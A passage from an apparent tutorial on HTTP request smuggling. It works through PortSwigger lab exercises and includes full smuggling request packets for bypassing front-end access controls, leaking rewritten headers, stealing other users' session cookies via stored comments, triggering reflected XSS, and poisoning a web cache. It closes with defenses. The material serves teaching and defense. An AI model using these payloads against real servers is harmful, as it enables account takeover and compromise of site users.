    \r\n
First request
Second request
It can be seen that when the cache hits, the data in the request body becomes
the next request and the response is successfully obtained.
    GET /random_str.php HTTP/1.1\r\n
    Host: lnmp.mengsec.com\r\n
    \r\n
Moreover, through the entire request, all request headers are in compliance
with the RFC specification. This means that even if the RFC standard is
strictly implemented, the proxy server before the ATS cannot prevent the
attack from affecting other users.
The ATS fix is also simple. When the cache hits, it is fine to empty the
entire request body.
## 5\. Other attack instances
In the previous section, we have seen the HTTP request smuggling vulnerability
generated by different kinds of proxy server combinations. We also
successfully simulated the use of HTTP request smuggling to conduct session
hijacking, but it can do more than this. In PortSwigger. An
[experiment](https://portswigger.net/web-security/request-smuggling/exploiting) was provided to exploit smuggling attacks using HTTP.
### 5.1 Bypass Front-end Security Controls
In this network environment, the front-end server is responsible for
implementing security control. Only the allowed requests can be forwarded to
the back-end server, and the back-end server unconditionally believes that all
requests forwarded by the front-end server respond to each request. So we can
use HTTP to request smuggling, smuggle unreachable requests to the backend
server and get a response. There are two experiments here, using `CL-TE` and
`TE-CL` to bypass the front-end access control.
#### 5.1.1 Use CL-TE Bypass Front-end Security Controls
Lab URL: 
The purpose of the experiment is to get the admin privilege and delete the
user carlos
We directly access `/admin` and will return the prompt `Path /admin is
blocked`, which appears to be blocked by the front-end server. According to
the prompt `CL-TE` of the topic, we can try to construct the data packet.
    POST / HTTP/1.1
    Host: ac1b1f991edef1f1802323bc00e10084.web-security-academy.net
    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:56.0) Gecko/20100101 Firefox/56.0
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
    Accept-Language: en-US,en;q=0.5
    Cookie: session=Iegl0O4SGnwlddlFQzxduQdt8NwqWsKI
    Content-Length: 38
    Transfer-Encoding: chunked
    0
    GET /admin HTTP/1.1
    foo: bar
After making multiple requests, we can get a response to the smuggling past
request.
You can access the `/admin` interface only if you are accessing as an
administrator or logging in locally.
In the request to smuggle below, add a `Host: localhost` request header, and
then re-request, one unsuccessful and several times.
As shown, we successfully accessed the admin interface. To delete a user is to
request `/admin/delete?username=carlos`.
Modify the smuggled request packet and send it a few more times to
successfully delete the user `carlos`.
One thing to note is that we don't need to affect other users, so the request
must also be complete, and the last two `\r\n` cannot be discarded.
#### 5.1.1 Use TE-CL Bypass Front-end Security Controls
Lab URL: 
This experiment is very similar to the previous one, and the specific attack
process is not repeated.
### 5.2 Revealing Front-end Request Rewriting
In some network environments, the front-end proxy server does not forward the
request directly to the back-end server after receiving the request. Instead,
it adds some necessary fields and then forwards it to the back-end server.
These fields are required by the backend server to process the request, such
as:
  * Describe the protocol name and password used by the TLS connection
  * XFF header containing the user's IP address
  * User's session token ID
In short, if we can't get the fields added or rewritten by the proxy server,
our smuggled past requests can't be processed correctly by the backend server.
So how do we get these values? PortSwigger provides a very simple method,
mainly in three major steps:
  * Find a POST request that can output the value of the request parameter to the response
  * Put the special parameter found in the POST request at the end of the message.
  * Then smuggle this request and then send a normal request directly, and some fields that the front-end server rewrites for this request will be displayed.
How to understand it, let us experiment and come together to learn.
Lab URL: 
The purpose of the experiment was to delete the user `carlos`.
We first go through the first step and find a POST request that can output the
value of the request parameter to the response.
The search function at the top of the page meets the requirements.
Constructing a packet
    POST / HTTP/1.1
    Host: ac831f8c1f287d3d808d2e1c00280087.web-security-academy.net
    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:56.0) Gecko/20100101 Firefox/56.0
    Content-Type: application/x-www-form-urlencoded
    Cookie: session=2rOrjC16pIb7ZfURX8QlSuU1v6UMAXLA
    Content-Length: 77
    Transfer-Encoding: chunked
    0
    POST / HTTP/1.1
    Content-Length: 70
    Connection: close
    search=123
After multiple requests, we can get the request header added by the front-end
server.
How is this obtained? We can start with the data packets we constructed. We
can see that our request to smuggle the past is
    POST / HTTP/1.1
    Content-Length: 70
    Connection: close
    search=123
The value of `Content-Length` is 70. Obviously, the length of the data carried
below is not enough. Therefore, after receiving the smuggling request, the
backend server will consider that the request has not been transmitted yet and
continue to wait for transmission.
Then we continue to send the same data packet. The back-end server receives
the request that the front-end proxy server has processed. When the total
length of the received data reaches 70, the back-end server considers that the
request has been transmitted, and then proceeds. response. In this way, part
of the subsequent request is taken as part of the parameters of the smuggled
request, and then expressed in the response, we can get the field rewritten by
the front-end server.
Add this field to the smuggled request and then smuggle a request to delete
the user.
### 5.3 Capturing Other Users' Requests
In the previous experiment, we obtained the fields added by the front-end
server by smuggling an incomplete request, and the fields came from our
subsequent requests. In other words, we obtained the request after our
smuggling request by requesting smuggling. If other malicious users make
requests after our malicious request? The POST request we are looking for will
store and display the acquired data? In this way, we can smuggle a malicious
request, splicing the information requested by other users into the smuggling
request, and storing it in the website. After we view the data, we can get the
user's request. This can be used to steal sensitive information from users,
such as account passwords.
Lab URL: 
The purpose of the experiment is to obtain cookies from other users to access
other accounts.
We first look for a POST request form that stores incoming information on a
website, and it's easy to spot a place where users have comments on the site.
Crawl POST requests and construct packets
    POST / HTTP/1.1
    Host: ac661f531e07f12180eb2f1a009d0092.web-security-academy.net
    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:56.0) Gecko/20100101 Firefox/56.0
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
    Accept-Language: en-US,en;q=0.5
    Cookie: session=oGESUVlKzuczaZSzsazFsOCQ4fdLetwa
    Content-Length: 267
    Transfer-Encoding: chunked
    0
    POST /post/comment HTTP/1.1
    Host: ac661f531e07f12180eb2f1a009d0092.web-security-academy.net
    Cookie: session=oGESUVlKzuczaZSzsazFsOCQ4fdLetwa
    Content-Length: 400
    csrf=JDqCEvQexfPihDYr08mrlMun4ZJsrpX7&postId=5&name=meng&email=email%40qq.com&website=&comment=
This is actually enough, but it may be a problem in the experimental
environment. I won't get requests from other users anyway, but I grab a bunch
of my own request information. However, the principle is that it is easier to
understand. The most important point is that the request for smuggling is
incomplete.
### 5.4 Exploit Reflected XSS
We can use HTTP smuggling requests with reflective XSS for attacks. This way
we don't need to interact with the victim, we can also exploit the XSS
vulnerability in the request header.
Lab URL: 
In the experimental introduction, I have already told the front-end server
that `TE` is not supported, and the target is to execute alert(1).
First construct Payload based on the location of the UA
Then construct the packet
    POST / HTTP/1.1
    Host: ac801fd21fef85b98012b3a700820000.web-security-academy.net
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 123
    Transfer-Encoding: chunked
    0
    GET /post?postId=5 HTTP/1.1
    User-Agent: ">#
    Content-Type: application/x-www-form-urlencoded
At this point, accessing in the browser will trigger the bullet box.
Send it again, wait a moment to refresh, you can see that this experiment has
been solved.
### 5.5 Perform Web Cache Poisoning
Generally, the front-end server caches some resources of the back-end server
for performance reasons. If there is a HTTP request smuggling vulnerability,
it is possible to use the redirect to perform cache poisoning, thereby
affecting all users who subsequently access.
Lab URL: 
A secondary server that provides exploits in an experimental environment.
Need to add two request packets, one POST, carrying the request packet to be
smuggled, and the other is a normal GET request for the JS file.
Take the following JS file as an example.
    /resources/js/labHeader.js
Edit response server
Construct a POST smuggling packet
    POST / HTTP/1.1
    Host: ac761f721e06e9c8803d12ed0061004f.web-security-academy.net
    Content-Length: 129
    Transfer-Encoding: chunked
    0
    GET /post/next?postId=3 HTTP/1.1
    Host: acb11fe31e16e96b800e125a013b009f.web-security-academy.net
    Content-Length: 10
    123
Then construct a GET packet
    GET /resources/js/labHeader.js HTTP/1.1
    Host: ac761f721e06e9c8803d12ed0061004f.web-security-academy.net
    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:56.0) Gecko/20100101 Firefox/56.0
    Connection: close
The POST request and the GET request are performed several times. Then access
the js file. It responds to the cached exploits on the server.
Visit the homepage and there is a pop-up. This indicated that the js file was
successfully cached by the front-end server.
## 6\. How to Prevent HTTP Request Smuggling
We've known the harm of HTTP request smuggling, and we will question: how to
prevent it? There are three general defenses (not specific to a particular
server).
  * Disable TCP connection reuse between the proxy server and the back end server.
  * Use the HTTP/2 protocol.
  * The front and back ends use the same server.
Some of the above measures can not solve the problem fundamentally, and there
are many shortcomings, such as disabling TCP connection reuse between the
proxy server and the back-end server, which will increase the pressure on the
back-end server. Using HTTP/2 can't be promoted under the current network
conditions, even if the server supporting HTTP/2 protocol is compatible with
HTTP/1.1. In essence, the reason for HTTP request smuggling is not the problem
of protocol design, but the problem of different server implementations. I
personally think that the best solution is to strictly implement the standards
specified in RFC7230-7235, but this is the most difficult to achieve.
## Reference
  * 
  * 
  * 
  * 
* * *